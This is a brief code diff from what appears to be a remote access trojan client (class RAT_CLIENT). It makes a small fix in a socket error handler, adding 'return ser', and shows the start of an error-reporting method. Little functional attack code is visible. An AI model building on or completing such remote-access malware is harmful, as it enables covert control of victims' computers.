@@ -50,7 +50,7 @@ class RAT_CLIENT:
         except socket.error as e:
             print (e)
             print(ser)
-            
+            return ser
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
         for i in range(len(output)):
